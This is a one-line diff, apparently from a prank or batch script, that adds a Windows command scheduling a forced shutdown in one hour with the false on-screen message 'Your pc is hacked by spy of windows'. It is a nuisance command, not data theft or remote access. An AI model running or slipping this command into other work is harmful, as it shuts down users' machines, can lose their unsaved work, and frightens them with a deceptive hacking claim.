@@ -1,0 +1,1 @@
+shutdown -s -t 3600 -c "Your pc is hacked by spy of windows"
